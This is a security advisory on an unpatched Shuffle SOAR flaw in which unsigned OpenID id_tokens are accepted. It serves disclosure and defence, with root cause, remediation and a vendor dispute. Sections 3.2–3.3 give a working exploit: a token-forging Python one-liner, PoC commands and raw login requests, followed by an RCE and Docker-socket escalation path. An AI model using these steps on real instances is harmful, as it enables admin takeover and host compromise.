# Shuffle SOAR (on-prem) — Unauthenticated OpenID Connect Authentication Bypass via Unsigned `id_token`

| | |
|---|---|
| **Vendor** | Shuffle AS (https://shuffler.io) |
| **Product** | Shuffle (SOAR), self-hosted / on-prem deployment |
| **Affected** | Shuffle ≤ 2.3.0 (latest stable) and 2.3.1-rc2 (latest pre-release); still present on `main` (2026-11-02) |
| **Vulnerable component** | Backend OpenID handler, `VerifyIdToken()` in Shuffle's Go module `shuffle-shared` (`oauth2.go`), compiled into `ghcr.io/shuffle/shuffle-backend` |
| **Fixed** | None at time of publication |
| **Vulnerability class** | CWE-347 Improper Verification of Cryptographic Signature → CWE-287 Improper Authentication |
| **Secondary issue** | CWE-200 — OpenID `client_secret` exposed to unauthenticated users via `GET /api/v1/checkusers` |
| **Attack vector** | Network, unauthenticated, no user interaction |
| **Prerequisite** | OpenID Connect SSO configured on the instance (a documented, supported enterprise feature) |
| **Impact** | Unauthenticated admin account takeover → remote code execution → host compromise via the mounted Docker socket |
| **CVSS v3.1** | **10.0 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **CVSS v4.0 vector** | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **Researcher** | Shail Shah |

---

## 1. Summary

The on-prem Shuffle backend accepts an OpenID Connect `id_token` POSTed to `/api/v1/login_openid`. The token is checked by `VerifyIdToken()` in `shuffle-shared/oauth2.go`, which **never verifies the token's signature**. It only base64-decodes the token, parses the JSON, and accepts it if the `aud` claim equals the org's OpenID `client_id` — a public value that the unauthenticated endpoint `GET /api/v1/checkusers` hands out to anyone.

An unauthenticated remote attacker can therefore write their own token and:

1. **Log in as any existing user** (including the org admin) without a password, MFA, or the identity provider; **or**
2. **Create a brand-new administrator account** with an arbitrary email. With the default SSO settings, unknown emails are auto-provisioned, and the role is taken from the attacker-controlled `roles` claim (`"shuffle-admin"` → `admin`). **The attacker does not need to know any existing user's email.**

The rogue admin account persists after logout, so it works as a backdoor.

A Shuffle administrator can upload and run custom apps (arbitrary Python), and the official deployment mounts the host's Docker socket into the backend and Orborus. The takeover therefore escalates to **unauthenticated remote code execution and full host compromise**. See section 4.

---

## 2. Root cause

### 2.1 No signature verification — `shuffle-shared/oauth2.go`

[`oauth2.go#L1882`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/oauth2.go#L1882) `VerifyIdToken()` splits the token on `.`, base64-decodes each part, unmarshals JSON, takes the org id from the `nonce`, and then ([`#L1969`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/oauth2.go#L1969)):

```go
if token.Aud == org.SSOConfig.OpenIdClientId || foundChallenge == org.SSOConfig.OpenIdClientSecret {
    token.Org = *org
    return token, nil
}
```

No JWKS lookup, no signature check, no `iss` check, no `exp` check. A token is "valid" when `aud` equals the public `client_id`.

For comparison, the authorization-code flow in the same codebase uses `VerifyIdTokenWithOIDC()` (go-oidc), which does check signature, issuer and audience correctly. Only the `id_token` POST path is broken.

### 2.2 The handler trusts the forged claims — `shuffle-shared/shared.go`

`HandleOpenId()` ([`shared.go#L25307`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/shared.go#L25307)) is used whenever `project.Environment != "cloud"`. On a `POST` with body `id_token=<token>` it calls `VerifyIdToken()` ([`#L25345`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/shared.go#L25345)) and copies `email` and `roles` straight from the token:

* **Existing email:** the handler issues a session for that user and applies the role from `roles`.
* **Unknown email:** if `SSOConfig.AutoProvision` is `false` (the default; the flag is inverted, see the comment at [`structs.go#L3607`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/structs.go#L3607)), it creates a new verified, active user ([`shared.go#L25962-L25974`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/shared.go#L25962-L25974)) with `role = "admin"` when `roles` contains `shuffle-admin`.

It then returns `303 See Other` with `Set-Cookie: session_token=…`.

### 2.3 The required values are public — `GET /api/v1/checkusers`

`checkAdminLogin()` (backend `main.go`, route `/api/v1/checkusers`, no auth) returns `sso_url`, built by `getOpenIdUrlOnPrem()`. The URL contains:

* `client_id=<client_id>` (the `aud` the attacker needs)
* `state=<base64>` → decodes to `org=<org_id>&...` (the `nonce` the attacker needs)
* **If a `client_secret` is configured**, `state` also contains `challenge=<client_secret>` in plaintext ([`shared.go#L16508`](https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/shared.go#L16508)), so the OpenID **client secret is disclosed to unauthenticated users**. This is a separate CWE-200 issue, and it also satisfies the second `||` branch of the check above.

The authenticated "get org" API redacts the client id as `CLEANED`, which shows these values are meant to be protected, yet `/checkusers` serves them in raw form.

---

## 3. Reproduction

Everything below was run against the official `ghcr.io/shuffle/shuffle-backend:2.3.0` image on 2026-11-02. The IdP URLs are placeholders: **no real identity provider is needed**, because the attack never contacts one.

### 3.1 Lab setup (one command, about 3 minutes)

Requirements: Linux, Docker with the compose plugin, `curl`, `python3`, about 4 GB free RAM.

```bash
git clone https://github.com/ssshah2131/Shuffle_CVE && cd Shuffle_CVE
bash setup_lab.sh
```

`setup_lab.sh` does the following, using only official Shuffle artifacts and standard admin APIs:

1. Downloads the official `docker-compose.yml` and `.env` from the `Shuffle/Shuffle` **v2.3.0** tag and pins the backend image to `2.3.0`.
2. Starts `opensearch` and `backend` (API on `http://localhost:5001`).
3. Registers the first admin `admin@victim.local` / `VictimAdminPass123!`, as on a fresh install.
4. **Enables OpenID Connect SSO**: this is the vulnerable configuration. The script does what an admin does in *Admin → Organization → SSO/OpenID* by calling:

```http
POST /api/v1/orgs/<org_id> HTTP/1.1
Host: localhost:5001
Authorization: Bearer <admin api key>
Content-Type: application/json

{"org_id":"<org_id>","editing":"sso_config",
 "sso_config":{"client_id":"shuffle-sso-client","client_secret":"",
               "openid_authorization":"https://idp.example.com/oauth2/authorize",
               "openid_token":"https://idp.example.com/oauth2/token"}}
```

To also show the client-secret leak, run `SECRET=SuperSecret123 bash setup_lab.sh`.

<details><summary>Manual setup, if you prefer not to run the script</summary>

```bash
mkdir shuffle-lab && cd shuffle-lab
curl -fsSLo docker-compose.yml https://raw.githubusercontent.com/Shuffle/Shuffle/v2.3.0/docker-compose.yml
curl -fsSLo .env               https://raw.githubusercontent.com/Shuffle/Shuffle/v2.3.0/.env
sed -i 's#shuffle-backend:latest#shuffle-backend:2.3.0#' docker-compose.yml
mkdir -p shuffle-database shuffle-files && chmod 777 shuffle-database
sudo sysctl -w vm.max_map_count=262144
docker compose up -d opensearch backend
# wait until: curl http://localhost:5001/api/v1/checkusers  ->  {"success": true, "reason": "stay"}

# create the admin and grab its API key
curl -s -X POST http://localhost:5001/api/v1/register -H 'Content-Type: application/json' \
     -d '{"username":"admin@victim.local","password":"VictimAdminPass123!"}'
# -> {"success": true, "apikey": "<APIKEY>"}

# get the org id
curl -s http://localhost:5001/api/v1/getinfo -H 'Authorization: Bearer <APIKEY>'   # -> active_org.id

# enable OpenID SSO (send the POST /api/v1/orgs/<org_id> request shown above)
```
</details>

The attacker knows **nothing** from this point on: no password, no API key, no org id, no client id.

### 3.2 Exploitation: automated PoC

```bash
# Variant A - take over the existing admin
python3 shuffle_openid_takeover.py --url http://localhost:5001 --email admin@victim.local

# Variant B - create a NEW admin; no knowledge of existing users needed
python3 shuffle_openid_takeover.py --url http://localhost:5001 --email attacker@evil.example
```

Observed output (Variant B):

```
[*] Discovering client_id / org_id from /api/v1/checkusers (no auth) ...
[+] client_id = shuffle-sso-client
[+] org_id    = e28b357f-3bab-440e-bf4f-1dad17a5fea6
[*] Forged unsigned id_token (no signature):
    eyJhdWQiOiAic2h1ZmZsZS1zc28tY2xpZW50IiwgIm5vbmNlIjogImIzSm5QV1V5T0dJek5UZG1MVE5p...
[*] POST /api/v1/login_openid -> HTTP 303
[+] Got session_token cookie: 13cdaaef-589f-490d-be19-3bce5577ba23
[*] GET /api/v1/getinfo with that cookie -> HTTP 200
    username = 'attacker@evil.example'   admin = 'true'

[+] SUCCESS - logged in as attacker@evil.example with no password.
```

The legitimate admin's user list then shows the persistent rogue account:

```
admin@victim.local     admin
attacker@evil.example  admin
```

### 3.3 Exploitation: manual (curl / Burp)

**Step 1: leak `client_id` and `org_id` (no auth)**

```http
GET /api/v1/checkusers HTTP/1.1
Host: localhost:5001
```
```json
{"success": true, "reason": "redirect",
 "sso_url": "https://idp.example.com/oauth2/authorize?client_id=shuffle-sso-client&response_type=code&...&state=b3JnPWUyOGIzNTdm...&..."}
```
Base64-decode `state` to get `org=<org_id>&challenge=...&redirect=...`.
If a client secret is configured, the decoded state reads `org=<org_id>&redirect=...&challenge=<CLIENT_SECRET>`.

**Step 2: forge the token.** Build this JSON and base64-encode it. There is no header and no signature:

```json
{"aud":"shuffle-sso-client","nonce":"<base64('org=<org_id>')>","email":"rogue@evil.example","sub":"poc","roles":["shuffle-admin"]}
```

The server splits the form body on `=`, so the base64 output must have no `=` padding. Add spaces inside the JSON until its byte length is a multiple of 3. Example:

```bash
python3 -c 'import json,base64;c=json.dumps({"aud":"shuffle-sso-client","nonce":base64.b64encode(b"org=<ORG_ID>").decode(),"email":"rogue@evil.example","sub":"poc","roles":["shuffle-admin"]});c+=" "*(-len(c)%3);print(base64.b64encode(c.encode()).decode())'
```

**Step 3: log in with the forged token (no auth)**

```http
POST /api/v1/login_openid HTTP/1.1
Host: localhost:5001
Content-Type: application/x-www-form-urlencoded

id_token=eyJhdWQiOiAic2h1ZmZsZS1zc28tY2xpZW50IiwgIm5vbmNlIjogImIzSm5QVGN3T0dWak16VTJMV0UyTmpRdE5EVmhZeTFpWWprMUxXVXdNR0l3T1dJMk5XWmxZdz09IiwgImVtYWlsIjogInJvZ3VlQGV2aWwuZXhhbXBsZSIsICJzdWIiOiAicG9jIiwgInJvbGVzIjogWyJzaHVmZmxlLWFkbWluIl19
```
```http
HTTP/1.1 303 See Other
Location: http://localhost:3001/workflows?type=sso_login
Set-Cookie: session_token=14464022-67cf-4830-9d69-6fd8fa9c4b23; Path=/; HttpOnly
Set-Cookie: __session=14464022-67cf-4830-9d69-6fd8fa9c4b23; Path=/; HttpOnly
```
(In Burp, turn off "follow redirects".)

**Step 4: confirm admin access**

```http
GET /api/v1/getinfo HTTP/1.1
Host: localhost:5001
Cookie: session_token=14464022-67cf-4830-9d69-6fd8fa9c4b23; __session=14464022-67cf-4830-9d69-6fd8fa9c4b23
```
```json
{"success": true, "admin": "true", "username": "rogue@evil.example", ... "active_org": {... "role": "admin"}}
```

### 3.4 Teardown

```bash
cd shuffle-lab && docker compose down -v && cd .. && sudo rm -rf shuffle-lab
```

---

## 4. Impact

### 4.1 Admin account takeover
* **Authentication bypass and privilege escalation:** an unauthenticated network attacker gains a full administrator session in any on-prem Shuffle org that uses OpenID SSO. SSO-enforced MFA is bypassed completely, because the IdP is never involved.
* **Persistence:** the attacker can create rogue admin accounts that survive password resets of legitimate users.
* **CWE-200:** when a client secret is configured, the OpenID client secret is also leaked to unauthenticated users.

### 4.2 Remote code execution (post-takeover)
With the forged admin session, the attacker uses Shuffle's built-in admin features to run attacker-controlled code:

1. **Upload an app:** `POST /api/v1/apps/upload`. A Shuffle app is Python code that Shuffle packages into a Docker image.
2. **Activate it:** `GET /api/v1/apps/{appId}/activate`. The backend builds the app image.
3. **Execute it:** `POST /api/v1/apps/{key}/execute`, or add the app to a workflow and run it. The attacker's Python runs inside Shuffle's execution environment, giving **remote code execution**.

Within this chain, the entry point is unauthenticated and the end result is code execution. The overall result is **unauthenticated RCE**.

### 4.3 Scope change: escape to the host and connected systems
* **Host compromise:** the official `docker-compose.yml` (v2.3.0, [lines 47 and 63](https://github.com/Shuffle/Shuffle/blob/v2.3.0/docker-compose.yml#L47)) mounts `/var/run/docker.sock` into the `backend` and `orborus` containers. Access to the Docker socket is root-equivalent on the host: it can start a privileged container that bind-mounts the host's `/`. The impact therefore leaves the Shuffle application and reaches the **underlying host OS**.
* **Connected systems:** Shuffle stores the API keys and credentials of every tool it automates (SIEM, EDR, firewalls, cloud accounts, ticketing, email). The attacker can read and use all of them to pivot into systems outside Shuffle's security authority.

### 4.4 CVSS v3.1 justification: 10.0 `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
| Metric | Value | Reason |
|---|---|---|
| AV | Network | Exploited over the web API |
| AC | Low | Deterministic token forgery; the required values are leaked by an unauthenticated endpoint |
| PR | None | No account required |
| UI | None | No victim interaction |
| **S** | **Changed** | The vulnerable component is Shuffle's authentication. The impacted components include the Docker host (via the mounted Docker socket) and the external systems whose credentials Shuffle holds. These are under a different security authority. |
| C/I/A | High | Full admin control, code execution and host access: read, modify, delete or disable anything |

---

## 5. Remediation

1. On the `id_token` POST path, verify tokens the same way the code flow already does (`VerifyIdTokenWithOIDC`). That means validating the signature against the IdP's JWKS and checking `iss`, `aud`, `exp` and `nonce`. Remove `VerifyIdToken()`.
2. Remove the `aud == client_id || challenge == client_secret` acceptance logic. Neither value proves that a token is authentic.
3. Never put the `client_secret` into the `state` parameter. Do not return raw SSO configuration from unauthenticated endpoints.
4. Do not take privilege (`roles`) from a token unless the token is cryptographically verified. Make auto-provisioning opt-in, and fix the inverted `auto_provision` flag.

**Workaround until fixed:** disable OpenID Connect SSO (clear the org's OpenID settings) or block `POST /api/v1/login_openid` at a reverse proxy.

---

## 6. Disclosure timeline and vendor response

| Date | Event |
|---|---|
| 2026-10-28 | Vulnerability discovered and verified against `shuffle-backend:latest` |
| 2026-10-28 | Full report and PoC sent to the Shuffle security team per their disclosure process |
| 2026-11-02 | Shuffle closed the report (response quoted below) |
| 2026-11-02 | Re-verified: still exploitable on 2.3.0 and on `shuffle-shared` `main` @ `c772fee`; no fix released |
| 2026-11-02 | Submitted to VulDB (CNA) for CVE assignment |

### Vendor response

> Thank you for taking the time to report this issue to us and for following our security disclosure process.
>
> After reviewing your report and the provided proof-of-concept steps, we are closing this report based on the following assessment:
>
> 1. OpenID Token Verification Hardening Already Underway: The legacy `VerifyIdToken` validation logic on the on-premises OpenID endpoint was already identified internally and undergoing remediation (`shuffle-shared` token validation tightening and transitioning OpenID flows to cryptographic OIDC verification via `VerifyIdTokenWithOIDC`) prior to this submission.
>
> 2. Deployment & Configuration Prerequisites: OpenID Connect SSO is not enabled by default on on-premises installations. Triggering this path requires an on-premises administrator to have manually configured OpenID SSO, as well as prior knowledge of a valid existing user's email address within that organization.
>
> 3. Admin App/Workflow Execution ("RCE") Is By Design: The second half of the report describes uploading an app, running a workflow as an administrator, and interacting with the worker container environment as Remote Code Execution (RCE). As a SOAR automation platform, allowing an authenticated administrator to build apps, execute workflows, and orchestrate containers is core, intended platform functionality by design and does not constitute a separate security vulnerability.
>
> — Shuffle GRC team

### Researcher's notes on the response

1. **"Remediation already underway."** The vendor confirms that the flaw is real and that `VerifyIdToken` lacks cryptographic verification. However, no released version contains a fix. As of 2026-11-02, the vulnerable `aud == client_id || …` check is still present in Shuffle 2.3.0, 2.3.1-rc2, `shuffle-shared` v1.3.35 and `main` @ `c772fee`. Fixing a bug internally does not prevent a CVE from being assigned. Users running affected versions need an identifier and an advisory.
2. **"SSO must be configured / attacker must know a valid email."** OpenID SSO is a documented, supported feature aimed at exactly the enterprise customers who run a SOAR. A vulnerability in an opt-in feature is still a vulnerability; this prerequisite is captured by CVSS v4 `AT:P`. The email requirement **does not hold**: Variant B (section 3.2) logs in with an email that does not exist, and Shuffle auto-provisions it as a new **admin** under default SSO settings. This was verified live on 2.3.0.
3. **"RCE is by design."** Code execution by an *authorized* admin is intended functionality, and this report does not claim it as a separate bug. The issue here is that an **unauthenticated** attacker gains that capability through the authentication bypass. Unauthenticated network access leading to code execution is RCE, whatever feature is used to reach it. Standard CVSS practice scores a vulnerability by its realistic end-to-end impact. Here that impact includes code execution and, through the Docker socket that Shuffle's own deployment mounts, compromise of the host. This is why the score uses Scope: Changed (10.0).

---

## 7. Files

| File | Purpose |
|---|---|
| `setup_lab.sh` | One-shot vulnerable lab: official Shuffle 2.3.0 with OpenID SSO enabled |
| `shuffle_openid_takeover.py` | Standalone PoC (Python stdlib only): auto-discovers values, forges the token, logs in, verifies admin |

## 8. References

* https://github.com/Shuffle/Shuffle (v2.3.0, v2.3.1-rc2)
* https://github.com/Shuffle/Shuffle/blob/v2.3.0/docker-compose.yml#L47 (Docker socket mount)
* https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/oauth2.go#L1969
* https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/shared.go#L25307
* https://github.com/Shuffle/shuffle-shared/blob/c772fee715286ce829c147d741da3c24be25586b/shared.go#L16508
* CWE-347: https://cwe.mitre.org/data/definitions/347.html
* CWE-287: https://cwe.mitre.org/data/definitions/287.html
* CWE-200: https://cwe.mitre.org/data/definitions/200.html

*For authorized testing and defensive purposes only.*
